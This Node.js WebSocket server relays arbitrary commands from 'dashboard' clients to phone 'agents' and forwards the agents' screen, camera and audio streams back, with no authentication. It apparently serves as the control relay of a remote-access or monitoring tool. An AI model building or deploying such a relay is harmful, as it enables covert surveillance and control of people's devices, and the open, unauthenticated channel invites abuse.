const WebSocket = require('ws');
const http = require('http');
const url = require('url');

const PORT = 8080;
const wss = new WebSocket.Server({ port: PORT });

// Stores
const agents = new Map(); // id -> socket
const dashboards = new Set();

console.log(`🚀 WebSocket Server running on ws://localhost:${PORT}`);

wss.on('connection', (ws, req) => {
    const parameters = url.parse(req.url, true).query;
    const role = parameters.role || 'agent';
    const agentId = parameters.id || `agent_${Math.random().toString(36).substr(2, 5)}`;

    if (role === 'dashboard') {
        dashboards.add(ws);
        console.log(`🖥️ Dashboard connected. Total: ${dashboards.size}`);
        
        // Send initial list of agents
        ws.send(JSON.stringify({ 
            type: 'init', 
            agents: Array.from(agents.keys()) 
        }));

        ws.on('message', (message) => {
            try {
                const data = JSON.parse(message.toString());
                if (data.cmd && data.target) {
                    const agent = agents.get(data.target);
                    if (agent && agent.readyState === WebSocket.OPEN) {
                        console.log(`➡️ Command to ${data.target}: ${data.cmd}`);
                        agent.send(JSON.stringify({ cmd: data.cmd }));
                    }
                }
            } catch (e) {
                // Ignore binary messages from dashboard (not expected)
            }
        });

        ws.on('close', () => {
            dashboards.delete(ws);
            console.log('🖥️ Dashboard disconnected');
        });

    } else {
        agents.set(agentId, ws);
        console.log(`📱 Agent connected: ${agentId}`);
        
        // Notify all dashboards
        broadcastToDashboards({ type: 'agent_online', id: agentId });

        ws.on('message', (message) => {
            // Forward binary data (Screen/Camera/Audio)
            if (Buffer.isBuffer(message) || message instanceof ArrayBuffer || ArrayBuffer.isView(message)) {
                
                const data = Buffer.isBuffer(message) ? message : Buffer.from(message);
                
                // We need to tell the dashboard which agent this is from.
                // Protocol: [ID_LENGTH (1 byte)][AGENT_ID (string)][ORIGINAL_MESSAGE (binary)]
                const agentIdBuf = Buffer.from(agentId);
                const header = Buffer.alloc(1 + agentIdBuf.length);
                header.writeUInt8(agentIdBuf.length, 0);
                agentIdBuf.copy(header, 1);
                
                const payload = Buffer.concat([header, data]);
                
                dashboards.forEach(db => {
                    if (db.readyState === WebSocket.OPEN) {
                        db.send(payload);
                    }
                });
            } else {
                // Handle JSON from agent if any (e.g. telemetry updates)
                try {
                    const data = JSON.parse(message.toString());
                    broadcastToDashboards({ type: 'agent_status', id: agentId, data });
                } catch(e) {}
            }
        });

        ws.on('close', () => {
            agents.delete(agentId);
            console.log(`📱 Agent disconnected: ${agentId}`);
            broadcastToDashboards({ type: 'agent_offline', id: agentId });
        });

        ws.on('error', (err) => {
            console.error(`📱 Agent ${agentId} error:`, err);
            agents.delete(agentId);
            broadcastToDashboards({ type: 'agent_offline', id: agentId });
        });
    }
});

function broadcastToDashboards(data) {
    const msg = JSON.stringify(data);
    dashboards.forEach(db => {
        if (db.readyState === WebSocket.OPEN) {
            db.send(msg);
        }
    });
}
